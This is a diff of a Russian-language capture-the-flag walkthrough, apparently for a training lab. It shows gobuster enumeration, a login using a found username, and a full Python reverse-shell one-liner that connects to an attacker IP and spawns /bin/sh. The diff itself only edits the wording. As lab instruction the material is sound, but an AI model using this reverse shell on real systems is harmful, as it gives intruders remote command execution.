@@ -14,15 +14,15 @@
 
 
 
-Далее, используя инструмент <mark style="color:blue;">**gobuster**</mark>** ** (`gobuster dir -u pent.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -x .php)` находим несколько скрытых папок
+Далее, используя инструмент <mark style="color:blue;">**gobuster**</mark>** ** (`gobuster dir -u pent.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -x .php)` находим несколько скрытых файлов
 
 <figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
-Конкретно в данному случае нас интересует папка **/login.php**, перейдя по которой мы попадаем на страницу авторизации
+Конкретно в данному случае нас интересует файл **/login.php**, перейдя по которому мы попадаем на страницу авторизации
 
 <figure><img src="../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
 
-В качестве имени пользователя я ввёл ранее найденное имя <mark style="color:blue;">**R1ckRul3s**</mark>, а в качестве пароля - записку в папке **/robots.txt**
+В качестве имени пользователя я ввёл ранее найденное имя <mark style="color:blue;">**R1ckRul3s**</mark>, а в качестве пароля - записку в файле **/robots.txt**
 
 Пройдя авторизацию, мы переходим на страницу с командной строкой и несколькими вкладками, которые нам недоступны (впрочем, они и не нужны)
 
@@ -38,7 +38,7 @@
 
 `python3 -c 'import socket,subprocess,os;s=socket.socket(`[`socket.AF`](https://vk.com/away.php?to=http%3A%2F%2Fsocket.AF\&cc\_key=)`_INET,socket.SOCK_STREAM);s.connect(("10.8.1.185",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=`[`subprocess.call`](https://vk.com/away.php?to=http%3A%2F%2Fsubprocess.call\&cc\_key=)`(["/bin/sh","-i"]);'`
 
-Подключив слушатель в терминале Linux и отправив данную оболочку в командную строку, получаем соединение с машиной.
+Запустив слушатель в терминале Linux, отправляем пейлоад в командную строку на сайте, затем получаем реверс шелл от лица пользователя **www-data**
 
 &#x20;
 
